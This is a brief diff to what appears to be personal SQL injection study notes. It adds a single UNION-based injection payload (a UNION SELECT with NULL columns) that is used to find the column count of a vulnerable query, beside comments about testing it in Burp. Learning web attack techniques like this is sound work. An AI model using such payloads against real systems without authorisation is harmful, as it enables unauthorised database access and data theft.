@@ -31,6 +31,7 @@ PRATICAL
 ##if u got any error on 4th column then they are only 3-columns
 
 # union based find the number of columns (u can tyr this on burp only)
+'+UNION+SELECT+NULL,NULL--
 
 
 ```
